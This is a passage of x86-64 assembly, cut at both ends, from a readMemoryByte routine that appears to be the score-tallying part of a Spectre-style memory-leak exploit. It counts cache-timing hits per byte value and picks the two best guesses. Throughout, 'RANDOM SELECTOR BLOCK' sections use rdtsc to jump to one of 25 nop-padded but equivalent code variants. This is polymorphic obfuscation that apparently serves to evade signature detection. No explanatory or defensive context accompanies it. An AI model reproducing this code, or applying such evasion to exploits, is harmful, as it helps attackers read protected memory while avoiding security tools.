	je	.LreadMemoryByte_win3_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win3_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win3_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win3_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win3_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win3_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win3_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win3_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win3_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win3_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win3_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win3_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win3_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win3_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win3_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win3_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win3_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win3_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win3_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win3_var24
	jmp	.LreadMemoryByte_win3_var0
## Variant 0
.LreadMemoryByte_win3_var0:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 1
.LreadMemoryByte_win3_var1:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 2
.LreadMemoryByte_win3_var2:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 3
.LreadMemoryByte_win3_var3:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 4
.LreadMemoryByte_win3_var4:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 5
.LreadMemoryByte_win3_var5:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 6
.LreadMemoryByte_win3_var6:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 7
.LreadMemoryByte_win3_var7:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 8
.LreadMemoryByte_win3_var8:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 9
.LreadMemoryByte_win3_var9:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 10
.LreadMemoryByte_win3_var10:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 11
.LreadMemoryByte_win3_var11:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 12
.LreadMemoryByte_win3_var12:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 13
.LreadMemoryByte_win3_var13:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 14
.LreadMemoryByte_win3_var14:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 15
.LreadMemoryByte_win3_var15:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 16
.LreadMemoryByte_win3_var16:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 17
.LreadMemoryByte_win3_var17:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 18
.LreadMemoryByte_win3_var18:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 19
.LreadMemoryByte_win3_var19:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 20
.LreadMemoryByte_win3_var20:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 21
.LreadMemoryByte_win3_var21:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	nop
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 22
.LreadMemoryByte_win3_var22:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 23
.LreadMemoryByte_win3_var23:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 24
.LreadMemoryByte_win3_var24:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
.LreadMemoryByte_win3_continue:
	movl	%edx, (%rax,%rcx,4)
LBB1_23:                                ##   in Loop: Header=BB1_19 Depth=2
	jmp	LBB1_24
LBB1_24:                                ##   in Loop: Header=BB1_19 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_19
LBB1_25:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$-1, -64(%rbp)
	movl	$-1, -60(%rbp)
	movl	$0, -56(%rbp)
LBB1_26:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win2_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win2_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win2_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win2_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win2_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win2_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win2_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win2_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win2_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win2_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win2_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win2_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win2_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win2_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win2_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win2_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win2_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win2_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win2_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win2_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win2_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win2_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win2_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win2_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win2_var24
	jmp	.LreadMemoryByte_win2_var0
## Variant 0
.LreadMemoryByte_win2_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 1
.LreadMemoryByte_win2_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 2
.LreadMemoryByte_win2_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 3
.LreadMemoryByte_win2_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 4
.LreadMemoryByte_win2_var4:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 5
.LreadMemoryByte_win2_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 6
.LreadMemoryByte_win2_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 7
.LreadMemoryByte_win2_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 8
.LreadMemoryByte_win2_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 9
.LreadMemoryByte_win2_var9:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 10
.LreadMemoryByte_win2_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 11
.LreadMemoryByte_win2_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 12
.LreadMemoryByte_win2_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 13
.LreadMemoryByte_win2_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 14
.LreadMemoryByte_win2_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 15
.LreadMemoryByte_win2_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 16
.LreadMemoryByte_win2_var16:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 17
.LreadMemoryByte_win2_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 18
.LreadMemoryByte_win2_var18:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 19
.LreadMemoryByte_win2_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 20
.LreadMemoryByte_win2_var20:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 21
.LreadMemoryByte_win2_var21:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 22
.LreadMemoryByte_win2_var22:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 23
.LreadMemoryByte_win2_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 24
.LreadMemoryByte_win2_var24:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
.LreadMemoryByte_win2_continue:
	movl	(%rax,%rcx,4), %eax
	movslq	-60(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	cmpl	(%rcx,%rdx,4), %eax
	jl	LBB1_30
LBB1_29:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-60(%rbp), %eax
	movl	%eax, -64(%rbp)
	movl	-56(%rbp), %eax
	movl	%eax, -60(%rbp)
	jmp	LBB1_34
LBB1_30:                                ##   in Loop: Header=BB1_26 Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win1_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win1_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win1_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win1_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win1_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win1_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win1_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win1_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win1_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win1_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win1_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win1_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win1_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win1_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win1_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win1_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win1_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win1_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win1_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win1_var19
	cmpl	$20, %eax
